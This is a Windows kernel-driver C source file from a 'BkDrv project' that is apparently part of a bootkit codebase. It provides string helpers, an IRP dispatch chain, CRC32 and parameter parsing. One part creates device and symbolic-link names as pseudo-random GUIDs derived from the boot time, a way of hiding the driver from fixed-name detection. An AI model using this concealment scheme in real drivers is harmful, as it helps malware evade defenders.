//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BkDrv project
//	
// module: bkdrv.c
// $Revision: 74 $
// $Date: 2012-06-14 15:27:29 +0400 (Чт, 14 июн 2012) $
// description: 
//	BK additional driver-support routines.

#include <ntddk.h>
#include <ntdddisk.h>
#include <ntstrsafe.h>
#include "bkdrv.h"
#include "kdbg.h"



#define		GUID_STR_LEN	16*2+4+2	// length of the GUID string in chars
#define		wczGuidStrTempl	L"{%08X-%04X-%04X-%04X-%08X%04X}"

static	LIST_ENTRY	BkDriverDispatchList = {0};


// ---- Unicode string -----------------------------------------------------------------------------------------------------

// 
//	Allocates empty space of PAGE_SIZE for a unicode string.
//
PUNICODE_STRING	BkAllocateUnicodeString(USHORT MaximumLength)
{
	PUNICODE_STRING	pUs;

	if (!MaximumLength)
		MaximumLength = PAGE_SIZE;

	if (pUs = MyAllocatePoolWithTag(PagedPool, MaximumLength + sizeof(UNICODE_STRING), 0))
	{
		pUs->Length = 0;
		pUs->MaximumLength = MaximumLength;
		pUs->Buffer = (PWSTR)((PCHAR)pUs + sizeof(UNICODE_STRING));
	}
	return(pUs);
}


//
//	Frees UNICODE_STRING previously allocated by BkAllocateUnicodeString() function.
//
VOID	BkFreeUnicodeString(PUNICODE_STRING	pUs)
{
	ASSERT(pUs->Buffer == NULL || pUs->Buffer == (PWSTR)((PCHAR)pUs + sizeof(UNICODE_STRING)));
	MyFreePool(pUs);
}

// ---- Driver dispatch table ----------------------------------------------------------------------------------------------

static NTSTATUS BkDriverDispatch(
	PDEVICE_OBJECT	DeviceObject,
	PIRP			Irp
	)
{
	NTSTATUS	ntStatus = STATUS_NOT_IMPLEMENTED;
	PLIST_ENTRY	pEntry = BkDriverDispatchList.Flink;
	PIO_STACK_LOCATION	IoStack = IoGetCurrentIrpStackLocation(Irp);

	while(pEntry != &BkDriverDispatchList && ntStatus == STATUS_NOT_IMPLEMENTED)
	{
		PBK_DRIVER_DISPATCH_TABLE	DispatchTable = CONTAINING_RECORD(pEntry, BK_DRIVER_DISPATCH_TABLE, Entry);
		if (DispatchTable->MajorFunction[IoStack->MajorFunction])
			ntStatus = (DispatchTable->MajorFunction[IoStack->MajorFunction])(DeviceObject, Irp);

		if (ntStatus == STATUS_NO_SUCH_DEVICE)
			ntStatus = STATUS_NOT_IMPLEMENTED;

		pEntry = pEntry->Flink;
	}

	if (ntStatus == STATUS_NOT_IMPLEMENTED)
	{
		// No dispatch routine found for the specified function
		Irp->IoStatus.Status = STATUS_NOT_IMPLEMENTED;
		Irp->IoStatus.Information = 0;

		IoCompleteRequest (Irp, IO_NO_INCREMENT);
	}

	return(ntStatus);
}


VOID BkInitDriverDispatch(
	PDRIVER_OBJECT	DriverObject
	)
{
	ULONG	i;

	InitializeListHead(&BkDriverDispatchList);
	for(i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		DriverObject->MajorFunction[i] = BkDriverDispatch;
}


PBK_DRIVER_DISPATCH_TABLE	BkAllocateDriverDispatchTable(VOID)
{
	PBK_DRIVER_DISPATCH_TABLE	DispatchTable = NULL;

	if (DispatchTable = MyAllocatePool(NonPagedPool, sizeof(BK_DRIVER_DISPATCH_TABLE)))
	{
		RtlZeroMemory(DispatchTable, sizeof(BK_DRIVER_DISPATCH_TABLE));
		InitializeListHead(&DispatchTable->Entry);
	}
	return(DispatchTable);
}



VOID BkRegisterDriverDispatchTable(
	PBK_DRIVER_DISPATCH_TABLE pDriverDispatchTable
	)
{
	InsertTailList(&BkDriverDispatchList, &pDriverDispatchTable->Entry);
}



// ---- Pseudo-random device name ---------------------------------------------------------------------------------------------


static ULONG MyRandom(PULONG pSeed)
{
	return(*pSeed = 1664525*(*pSeed)+1013904223);
}


//
//	Creates system time-stamp based on a day the system started up.
//
static ULONG GetSystemTimeStamp(VOID)
{
	LARGE_INTEGER	Frequency;
	LARGE_INTEGER	SystemTime;
	LARGE_INTEGER	TickCount = KeQueryPerformanceCounter(&Frequency);
	ULONGLONG	SecElapsed, SecStarted;

	KeQuerySystemTime(&SystemTime);

	// Calculating number of seconds elapsed since the system started
	SecElapsed = *(PULONGLONG)&TickCount / *(PULONGLONG)&Frequency;

	// Calculating number of seconds elapsed since January 1, 1601 (UTC) before the system started
	SecStarted = *(PULONGLONG)&SystemTime / 10000000 - SecElapsed;

	// Calculating number of 3-day intervals elapsed since January 1, 1601 (UTC) before the system started
	SecStarted /= (3600 * 24 * 3);

	return((ULONG)(SecStarted));
}


//
//	Generates a GUID based on the specified seed value. The same seeds will create the same GUIDs on the same machine.
//
VOID BkGuidFromSeed(GUID* pGuid, PULONG pSeed)
{
	ULONG i;
	pGuid->Data1 = MyRandom(pSeed);
	pGuid->Data2 = (USHORT)MyRandom(pSeed);
	pGuid->Data3 = (USHORT)MyRandom(pSeed);
	for (i=0; i<8; i++)
		pGuid->Data4[i] = (UCHAR)MyRandom(pSeed);
}

#pragma warning(disable:4995)
//
//	Converts the specified GUID structure into 0-terminated string.
//
static PWCHAR GuidToString(GUID* pGuid)
{
	PWCHAR GuidStr = (PWCHAR)MyAllocatePool(PagedPool, (GUID_STR_LEN+1)*sizeof(WCHAR));
	if (GuidStr)
		_snwprintf(GuidStr, (GUID_STR_LEN + 1), wczGuidStrTempl, pGuid->Data1, pGuid->Data2, pGuid->Data3, *(USHORT*)&pGuid->Data4[0], *(ULONG*)&pGuid->Data4[2],  *(USHORT*)&pGuid->Data4[6]);

	return(GuidStr);
}


PWCHAR	BkGenerateGuidString(ULONG Seed)
{
	ULONG	SysTimeStamp = GetSystemTimeStamp();
	PWCHAR	GuidName, DeviceName = NULL;
	GUID	Guid;

	SysTimeStamp ^= Seed;

	BkGuidFromSeed(&Guid, &SysTimeStamp);
	DeviceName = GuidToString(&Guid);

	return(DeviceName);
}


//
//	Create pseudo-random named device.
//
NTSTATUS	BkCreateRandomNamedDevice(
	PDRIVER_OBJECT		DriverObject,
	ULONG				Seed,
	ULONG				DeviceType,
	PUNICODE_STRING*	pDeviceName,
	PDEVICE_OBJECT*		pDeviceObject
	)
{
	NTSTATUS		ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PWCHAR			wDeviceName = NULL;

	do	// not a loop
	{
		if (!(wDeviceName = BkGenerateGuidString(Seed)))
			break;			

		if (!(*pDeviceName = BkAllocateUnicodeString(0)))
			break;
	
		if (!NT_SUCCESS(RtlAppendUnicodeToString(*pDeviceName, wczDeviceName)))
			break;

		if (!NT_SUCCESS(RtlAppendUnicodeToString(*pDeviceName, wDeviceName)))
			break;

		ntStatus = IoCreateDevice(DriverObject, 0, *pDeviceName, DeviceType, 0, FALSE, pDeviceObject);

	} while(FALSE);

	if (wDeviceName)
		MyFreePool(wDeviceName);

	return(ntStatus);
}


//
//	Create pseudo-random named symbolic link.
//
NTSTATUS BkCreateRandomNamedLink(
	PUNICODE_STRING uDeviceName, 
	ULONG Seed, 
	PUNICODE_STRING* pLinkName
	)
{
	PWCHAR	wDeviceName = NULL;
	NTSTATUS ntStatus = STATUS_INSUFFICIENT_RESOURCES;

	do	// not a loop
	{
		if (!(wDeviceName = BkGenerateGuidString(Seed)))
			break;

		if (!(*pLinkName = BkAllocateUnicodeString(0)))
			break;

		if (!NT_SUCCESS(RtlAppendUnicodeToString(*pLinkName, wczLinkName)))
			break;

		if (!NT_SUCCESS(RtlAppendUnicodeToString(*pLinkName, wDeviceName)))
			break;

		ntStatus = IoCreateSymbolicLink(*pLinkName, uDeviceName);
	} while(FALSE);

	if (wDeviceName)
		MyFreePool(wDeviceName);

	return(ntStatus);
}

// ---- HASH functions ------------------------------------------------------------------------------------------------------

//
//	Caclulates CRC32 hash of the data within the specified buffer
//
ULONG BkCRC32(
	PCHAR pMem,		// data buffer
	ULONG uLen		// length of the buffer in bytes
	)
{
  ULONG		I, C;
  ULONG		dwSeed =  -1;

  while( uLen-- )
  {
    C = *pMem;
    pMem = pMem + 1;

    for( I = 0; I < 8; I++ )
    {
      if ( (dwSeed ^ C) & 1 )
        dwSeed = (dwSeed >> 1) ^ 0xEDB88320;
      else
        dwSeed = (dwSeed >> 1);

      C >>= 1;
    }
  }

  return((ULONG)dwSeed);
}


// ---- String manipulation routines ----------------------------------------------------------------------------------------

//
//	Removes spaces and special symbols from the beginning and the end of the specified NULL-terminated string.
//
PCHAR strspace(
	PCHAR Str
	)
{
	ULONG Len;

	while(Str[0] > 0 && Str[0] < '!')
		Str += 1;

	if (Len = (ULONG)strlen(Str))
	{
		while(Str[Len-1] > 0 && Str[Len-1] < '!')
		{
			Len -= 1;
			Str[Len] = 0;
		}
	}	// if (Len = (ULONG)strlen(Str))
	return(Str);
}


//
//	Scans the specified buffer of chars for the text line (limited by CR, LF or NULL-char).
//
ULONG BufferGetLine(
	PCHAR Buffer,		// Buffer to scan for the text line
	ULONG Size,			// Size of the buffer
	PCHAR* pLine,		// Returns position of the text line found
	PULONG pLineSize	// Returns size of the text line found
	)
{
	ULONG	Ret = FALSE;
	ULONG	LineSize = 0;
	PCHAR	Line;

	while(Size && (Buffer[0] == 0xa || Buffer[0] == 0xd))
	{
		Buffer += 1;
		Size -= 1;
	}

	Line = Buffer;

	while(Size && Buffer[0] != 0xa && Buffer[0] != 0xd)
	{
		Buffer += 1;
		LineSize += 1;
		Size -= 1;
	}

	if (LineSize)
	{
		*pLine = Line;
		*pLineSize = LineSize;
		Ret = TRUE;
	}

	return(Ret);
}


PCHAR	GetNextParam(PCHAR	CmdLine)
{
	PCHAR cStr, Next = NULL;
	
	if ((cStr = strchr(CmdLine, ',')) || (cStr = strchr(CmdLine, ' ')) || (cStr = strchr(CmdLine, 9)))
		Next = strspace(cStr + 1);
	else
		cStr = CmdLine + strlen(CmdLine);

	do
	{
		*cStr = 0;
		cStr -= 1;
	} while(cStr > CmdLine && (*cStr == ' ' || *cStr == 9));

	return(Next);
}


//
//	Parses the specified command line into 4 parameters devided by ','.
//	Returns number of parameters found.
//
ULONG	ParseCommandLine(
	PCHAR	CmdLine,
	PCHAR*	pParam0,
	PCHAR*	pParam1,
	PCHAR*	pParam2,
	PCHAR*	pParam3
	)
{
	ULONG	NumberParams = 1;
	PCHAR	cStr;
	ULONG	Len;

	do	// not a loop
	{
		if (pParam0)
			*pParam0 = strspace(CmdLine);

		if (pParam1)
		{
			if (!(CmdLine = GetNextParam(CmdLine)))
				break;
				
			*pParam1 = CmdLine;
			NumberParams += 1;

			if (pParam2)
			{
				if (!(CmdLine = GetNextParam(CmdLine)))
					break;
			
				*pParam2 = CmdLine;
				NumberParams += 1;

				if (pParam3)
				{
					if (!(CmdLine = GetNextParam(CmdLine)))
						break;
				
					*pParam3 = CmdLine;
					NumberParams += 1;
				}
			}	// if (pParam2)
		}	// if (pParam1)
	} while(FALSE);

	return(NumberParams);
}


//
//	Removes spaces and special symbols from the beginning and the end of the specified NULL-terminated string.
//
PCHAR strtrim(
	PCHAR Str,
	PCHAR SubChars
	)
{
	CHAR	c;
	PCHAR	Str0;
	ULONG	Len;

	Str0 = Str;

	while((c = *Str0) && strchr(SubChars, c))
		Str0 += 1;

	Len = strlen(Str0);

	while((Len) && strchr(SubChars, Str0[Len-1]))
		Len -= 1;

	memcpy(Str, Str0, Len);
	Str[Len] = 0;

	return(Str);
}


//
//	Converts the specified string into the ineteger value.
//
ULONG strtol(
	PCHAR	Str,
	PCHAR*	End,
	LONG	Radix
	)
{
	ULONG Int = 0;
	ANSI_STRING		As;
	UNICODE_STRING	Us;

	RtlInitAnsiString(&As, Str);
	RtlAnsiStringToUnicodeString(&Us, &As, TRUE);
	
	RtlUnicodeStringToInteger(&Us, 0, &Int);

	RtlFreeUnicodeString(&Us);

	return(Int);
}
